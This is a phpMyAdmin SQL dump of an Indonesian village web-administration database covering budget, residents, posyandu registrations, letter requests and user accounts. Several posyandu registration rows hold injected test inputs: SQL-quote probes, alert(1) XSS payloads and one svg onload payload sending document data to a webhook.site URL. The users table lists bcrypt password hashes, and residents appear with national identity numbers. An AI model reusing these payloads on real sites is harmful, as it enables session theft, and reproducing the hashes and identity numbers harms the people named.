-- phpMyAdmin SQL Dump
-- version 4.9.0.1
-- https://www.phpmyadmin.net/
--
-- Host: sql105.byetcluster.com
-- Generation Time: Jan 01, 2026 at 09:33 PM
-- Server version: 11.4.9-MariaDB
-- PHP Version: 7.2.22

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET AUTOCOMMIT = 0;
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `b15_40753268_webdesa`
--

-- --------------------------------------------------------

--
-- Table structure for table `apb_desa`
--

CREATE TABLE `apb_desa` (
  `id` int(11) NOT NULL,
  `tahun` int(4) NOT NULL,
  `uraian` varchar(200) NOT NULL,
  `nominal` double NOT NULL,
  `jenis` enum('Pendapatan','Belanja') NOT NULL,
  `id_user` int(11) DEFAULT 1
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `apb_desa`
--

INSERT INTO `apb_desa` (`id`, `tahun`, `uraian`, `nominal`, `jenis`, `id_user`) VALUES
(1, 2025, 'Dana Desa (DD)', 850000000, 'Pendapatan', 1),
(2, 2025, 'Pendapatan Asli Desa (PADes)', 50000000, 'Pendapatan', 1);

-- --------------------------------------------------------

--
-- Table structure for table `berita`
--

CREATE TABLE `berita` (
  `id` int(11) NOT NULL,
  `judul` varchar(200) NOT NULL,
  `slug` varchar(200) NOT NULL,
  `isi` text NOT NULL,
  `kategori` varchar(50) DEFAULT 'Kegiatan',
  `gambar` varchar(100) DEFAULT 'default.jpg',
  `tanggal` datetime DEFAULT current_timestamp(),
  `id_user` int(11) DEFAULT 1
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `berita`
--

INSERT INTO `berita` (`id`, `judul`, `slug`, `isi`, `kategori`, `gambar`, `tanggal`, `id_user`) VALUES
(8, 'test', 'test', 'test', 'Kegiatan', '1767164171_images.jpg', '2025-12-30 22:56:11', 3);

-- --------------------------------------------------------

--
-- Table structure for table `inventaris`
--

CREATE TABLE `inventaris` (
  `id` int(11) NOT NULL,
  `nama_barang` varchar(100) NOT NULL,
  `jumlah` int(11) NOT NULL,
  `kondisi` enum('Baik','Rusak Ringan','Rusak Berat') NOT NULL,
  `tgl_pengadaan` date NOT NULL,
  `id_user` int(11) DEFAULT 1
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `inventaris`
--

INSERT INTO `inventaris` (`id`, `nama_barang`, `jumlah`, `kondisi`, `tgl_pengadaan`, `id_user`) VALUES
(1, 'Laptop ASUS', 2, 'Baik', '2024-01-10', 1),
(2, 'Printer Epson', 1, 'Rusak Ringan', '2023-05-20', 1);

-- --------------------------------------------------------

--
-- Table structure for table `jadwal`
--

CREATE TABLE `jadwal` (
  `id` int(11) NOT NULL,
  `kegiatan` varchar(100) NOT NULL,
  `hari` varchar(20) NOT NULL,
  `jam` varchar(20) NOT NULL,
  `petugas` varchar(200) NOT NULL,
  `jenis` enum('Ronda','Posyandu') NOT NULL,
  `id_penanggung_jawab` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `jadwal`
--

INSERT INTO `jadwal` (`id`, `kegiatan`, `hari`, `jam`, `petugas`, `jenis`, `id_penanggung_jawab`) VALUES
(1, 'Ronda RT 01', 'Senin', '21:00 - 04:00', 'Pak Budi, Pak Tono', 'Ronda', 1),
(2, 'Ronda RT 02', 'Selasa', '21:00 - 04:00', 'Pak Ahmad, Pak Dedi', 'Ronda', 1),
(3, 'Posyandu Melati', 'Rabu', '08:00 - 11:00', 'Bidan Desa', 'Posyandu', 1);

-- --------------------------------------------------------

--
-- Table structure for table `penduduk`
--

CREATE TABLE `penduduk` (
  `id` int(11) NOT NULL,
  `nik` varchar(16) NOT NULL,
  `nama` varchar(100) NOT NULL,
  `jk` enum('L','P') NOT NULL,
  `alamat` text NOT NULL,
  `pekerjaan` varchar(50) DEFAULT 'Wiraswasta'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `penduduk`
--

INSERT INTO `penduduk` (`id`, `nik`, `nama`, `jk`, `alamat`, `pekerjaan`) VALUES
(1, '1871010001', 'Budi Santoso', 'L', 'Jl. Mawar No 1', 'Petani'),
(2, '1871010002', 'Siti Aminah', 'P', 'Jl. Melati No 2', 'Guru'),
(3, '1871010003', 'Ahmad Dani', 'L', 'Jl. Kamboja No 5', 'Pedagang'),
(4, '1871072711060001', 'M. Erwin', 'L', 'Jl. Anggrek no. 2', 'Karyawan Swasta'),
(5, '1871010004', 'Prana Alfath Rais', 'L', 'Jl. Kamboja No 3', 'Karyawan Swasta');

-- --------------------------------------------------------

--
-- Table structure for table `posyandu_pendaftaran`
--

CREATE TABLE `posyandu_pendaftaran` (
  `id` int(11) NOT NULL,
  `id_sesi` int(11) NOT NULL,
  `nama_ibu` varchar(100) NOT NULL,
  `nama_balita` varchar(100) NOT NULL,
  `usia_balita` int(3) NOT NULL COMMENT 'Dalam Bulan',
  `status_approval` enum('Menunggu','Disetujui','Ditolak') DEFAULT 'Menunggu'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `posyandu_pendaftaran`
--

INSERT INTO `posyandu_pendaftaran` (`id`, `id_sesi`, `nama_ibu`, `nama_balita`, `usia_balita`, `status_approval`) VALUES
(1, 1, 'a', 'a', 2, 'Disetujui'),
(2, 1, 'dwd', 'dwd', 1, 'Menunggu'),
(3, 1, '.', '.', 2, 'Menunggu'),
(4, 1, '<b>TEST TEBAL</b>', '<b>TEST TEBAL</b>', 2, 'Menunggu'),
(5, 1, '<script>alert(1)</script>', '<script>alert(1)</script>', 1, 'Menunggu'),
(6, 1, '1', '1', 1, 'Menunggu'),
(7, 1, '\'', '\'', 1, 'Menunggu'),
(8, 1, '<b>TES TEBAL</b>', 'qsqsq', 1, 'Menunggu'),
(9, 1, '<b>TES TEBAL</b>', 'qsqsq', 1, 'Menunggu'),
(10, 1, '\'', '\'', 1, 'Menunggu'),
(11, 1, '\'', '\'', 1, 'Menunggu'),
(12, 1, '<svg/onload=alert(1)>', 'qsqsq', 1, 'Menunggu'),
(13, 1, '<body onload=alert(1)>', 'ee2we', 1, 'Menunggu'),
(14, 1, '<svg/onload=window.location=\"https://webhook.site/3b3382ad-c3dd-449a-a2a0-20dff5165282?c=\"+document.', 'ffefe', 1, 'Menunggu');

-- --------------------------------------------------------

--
-- Table structure for table `posyandu_sesi`
--

CREATE TABLE `posyandu_sesi` (
  `id` int(11) NOT NULL,
  `nama_kegiatan` varchar(100) NOT NULL,
  `tanggal` date NOT NULL,
  `jam_mulai` time NOT NULL,
  `jam_selesai` time NOT NULL,
  `status` enum('Buka','Tutup') DEFAULT 'Tutup',
  `kuota_maksimal` int(11) DEFAULT 50
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `posyandu_sesi`
--

INSERT INTO `posyandu_sesi` (`id`, `nama_kegiatan`, `tanggal`, `jam_mulai`, `jam_selesai`, `status`, `kuota_maksimal`) VALUES
(1, 'Posyandu Melati - Penimbangan Balita', '2025-12-26', '08:00:00', '11:00:00', 'Tutup', 30);

-- --------------------------------------------------------

--
-- Table structure for table `surat`
--

CREATE TABLE `surat` (
  `id` int(11) NOT NULL,
  `nama_pemohon` varchar(100) NOT NULL,
  `nik_pemohon` varchar(16) NOT NULL,
  `jenis_surat` varchar(100) NOT NULL,
  `keterangan` text DEFAULT NULL,
  `tanggal` date NOT NULL,
  `status` enum('Pending','Verifikasi Sekdes','Siap Diambil','Ditolak') DEFAULT 'Pending',
  `status_approval` enum('Pending','Disetujui','Ditolak') DEFAULT 'Pending',
  `tgl_approval` datetime DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `surat`
--

INSERT INTO `surat` (`id`, `nama_pemohon`, `nik_pemohon`, `jenis_surat`, `keterangan`, `tanggal`, `status`, `status_approval`, `tgl_approval`) VALUES
(8, 'M. Erwin', '1871072711060001', 'Surat Keterangan Usaha', 'Untuk Keperluan bikin warung', '2025-12-30', 'Siap Diambil', 'Pending', '2025-12-30 22:08:20'),
(9, 'M. Erwin', '1871072711060001', 'Surat Pengantar SKCK', 'untuk lamar kerja', '2025-12-30', 'Ditolak', 'Pending', NULL);

-- --------------------------------------------------------

--
-- Table structure for table `users`
--

CREATE TABLE `users` (
  `id` int(11) NOT NULL,
  `username` varchar(50) NOT NULL,
  `password` varchar(255) NOT NULL,
  `nama_lengkap` varchar(100) NOT NULL,
  `role_level` int(1) NOT NULL COMMENT '1:Dev, 2:Kades, 3:Sekdes, 4:Bendahara'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `users`
--

INSERT INTO `users` (`id`, `username`, `password`, `nama_lengkap`, `role_level`) VALUES
(1, 'SteVenJr', '$2y$10$.OxaOQp9REbJMCa.LJjzeuUEnbJOgyItWk4jUeFnExdL9KyxirpKW', 'Steven (Developer)', 1),
(2, 'Kades', '$2y$10$9cp5Wc7IZ5tdxGBEu9EeX.pM634gGTFHi4KhwUTvxTFRFPxWu9tk6', 'Bapak Kepala Desa', 2),
(3, 'Sekretaris', '$2y$10$0KNoZ/Gw0Co6.Ob5LhSc3uC/SmfgrBc8Br4W73Kq7D2UQOdv9gJte', 'Ibu Sekretaris', 3),
(4, 'Bendahara', '$2y$10$U01G/qb7UQ7Tk6/u08ulZe520ZO.DqtSBhDoMyelVshWq6.cXsPWm', 'Ibu Bendahara', 4),
(5, '1871072711060001', '$2y$10$1D93MF6vzTqR5Ay9/Pz74eAI/I5WBbQaUnKneMr74feQLA6nZD7XC', 'M. Erwin', 5),
(7, 'prana', '$2a$12$VRaspHxOsiyDQX9tF.BnQub5ljIjIulhQGcc5zzZRthG0aVVZVpky', 'Prana Alfath Rais', 5),
(8, '1871010004', '$2y$10$H/JADMMoQPZebwiEPYO.xedNUgFYWXV.NPPmvCBj0QSeNTFVgsPi2', 'Prana Alfath Rais', 5);

--
-- Indexes for dumped tables
--

--
-- Indexes for table `apb_desa`
--
ALTER TABLE `apb_desa`
  ADD PRIMARY KEY (`id`),
  ADD KEY `fk_apb_users` (`id_user`);

--
-- Indexes for table `berita`
--
ALTER TABLE `berita`
  ADD PRIMARY KEY (`id`),
  ADD KEY `fk_berita_users` (`id_user`);

--
-- Indexes for table `inventaris`
--
ALTER TABLE `inventaris`
  ADD PRIMARY KEY (`id`),
  ADD KEY `fk_inventaris_users` (`id_user`);

--
-- Indexes for table `jadwal`
--
ALTER TABLE `jadwal`
  ADD PRIMARY KEY (`id`),
  ADD KEY `fk_jadwal_penduduk` (`id_penanggung_jawab`);

--
-- Indexes for table `penduduk`
--
ALTER TABLE `penduduk`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `nik` (`nik`);

--
-- Indexes for table `posyandu_pendaftaran`
--
ALTER TABLE `posyandu_pendaftaran`
  ADD PRIMARY KEY (`id`),
  ADD KEY `id_sesi` (`id_sesi`);

--
-- Indexes for table `posyandu_sesi`
--
ALTER TABLE `posyandu_sesi`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `surat`
--
ALTER TABLE `surat`
  ADD PRIMARY KEY (`id`),
  ADD KEY `fk_surat_penduduk` (`nik_pemohon`);

--
-- Indexes for table `users`
--
ALTER TABLE `users`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `apb_desa`
--
ALTER TABLE `apb_desa`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=6;

--
-- AUTO_INCREMENT for table `berita`
--
ALTER TABLE `berita`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=9;

--
-- AUTO_INCREMENT for table `inventaris`
--
ALTER TABLE `inventaris`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;

--
-- AUTO_INCREMENT for table `jadwal`
--
ALTER TABLE `jadwal`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=4;

--
-- AUTO_INCREMENT for table `penduduk`
--
ALTER TABLE `penduduk`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=6;

--
-- AUTO_INCREMENT for table `posyandu_pendaftaran`
--
ALTER TABLE `posyandu_pendaftaran`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=15;

--
-- AUTO_INCREMENT for table `posyandu_sesi`
--
ALTER TABLE `posyandu_sesi`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT for table `surat`
--
ALTER TABLE `surat`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=10;

--
-- AUTO_INCREMENT for table `users`
--
ALTER TABLE `users`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=9;

--
-- Constraints for dumped tables
--

--
-- Constraints for table `apb_desa`
--
ALTER TABLE `apb_desa`
  ADD CONSTRAINT `fk_apb_users` FOREIGN KEY (`id_user`) REFERENCES `users` (`id`) ON DELETE CASCADE ON UPDATE CASCADE;

--
-- Constraints for table `berita`
--
ALTER TABLE `berita`
  ADD CONSTRAINT `fk_berita_penulis` FOREIGN KEY (`id_user`) REFERENCES `users` (`id`) ON DELETE CASCADE ON UPDATE CASCADE,
  ADD CONSTRAINT `fk_berita_users` FOREIGN KEY (`id_user`) REFERENCES `users` (`id`) ON DELETE CASCADE ON UPDATE CASCADE;

--
-- Constraints for table `inventaris`
--
ALTER TABLE `inventaris`
  ADD CONSTRAINT `fk_inventaris_users` FOREIGN KEY (`id_user`) REFERENCES `users` (`id`) ON DELETE CASCADE ON UPDATE CASCADE;

--
-- Constraints for table `jadwal`
--
ALTER TABLE `jadwal`
  ADD CONSTRAINT `fk_jadwal_penduduk` FOREIGN KEY (`id_penanggung_jawab`) REFERENCES `penduduk` (`id`) ON DELETE CASCADE ON UPDATE CASCADE;

--
-- Constraints for table `posyandu_pendaftaran`
--
ALTER TABLE `posyandu_pendaftaran`
  ADD CONSTRAINT `posyandu_pendaftaran_ibfk_1` FOREIGN KEY (`id_sesi`) REFERENCES `posyandu_sesi` (`id`) ON DELETE CASCADE;

--
-- Constraints for table `surat`
--
ALTER TABLE `surat`
  ADD CONSTRAINT `fk_surat_penduduk` FOREIGN KEY (`nik_pemohon`) REFERENCES `penduduk` (`nik`) ON DELETE CASCADE ON UPDATE CASCADE;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
